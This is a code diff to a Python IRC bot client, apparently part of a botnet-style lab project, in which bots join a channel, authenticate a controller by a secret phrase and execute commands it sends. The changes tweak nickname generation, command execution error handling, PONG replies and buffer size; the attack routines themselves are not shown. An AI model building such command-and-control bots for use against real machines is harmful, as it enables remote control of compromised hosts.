@@ -16,12 +16,13 @@ class Bot_Client:
         self.port = port
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
-        self.bot_counter = random.randint(1,100)
+        self.bot_counter = 1
         self.bot_nick = "robotnik" + str(self.bot_counter)
         self.irc_socket = None
         self.controller = None
         self.controller_nick = None
         self.attack_counter = 0
+        # self.identifier = "Have you ever danced with the devil in the pale moonlight?"
 
     def start_client(self):
         connected, self.irc_socket = self.__attempt_connection(5)
@@ -43,8 +44,6 @@ class Bot_Client:
             input_list = text.split(' :')
             command = input_list[1].strip()
 
-            # execute the command
-            # self.execute_command(command)
             try:
                 self.execute_command(command)
             except socket.error:
@@ -84,7 +83,7 @@ class Bot_Client:
             conn_socket.send(("NICK "+ self.bot_nick+"\n").encode()) # sets nick
             response = conn_socket.recv(2040).decode()
             if "433" in response:
-                self.bot_counter += 1
+                self.bot_counter += random.randint(1,100)
                 self.bot_nick = "robotnik" + str(self.bot_counter)
             elif "001" in response:
                 valid_nick = True
@@ -129,9 +128,9 @@ class Bot_Client:
 
     # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
     def get_text(self):
-        text = self.recv_msg() #receive the text
+        text = self.recv_msg()#.strip() #receive the text
         if text.find('PING') != -1:
-            self.send_msg('PONG ' + text.split()[1] + 'rn')
+            self.send_msg('PONG ' + text.split()[1] + '\r\n')
         return text
 
     # function to receive and execute the command sent by the controller
@@ -249,7 +248,7 @@ class Bot_Client:
         self.irc_socket.send(message.encode())
 
     def recv_msg(self):
-        data = self.irc_socket.recv(2040).decode()  #receive the text
+        data = self.irc_socket.recv(4096).decode()  #receive the text
         if data == "":
             raise socket.error()
         return data
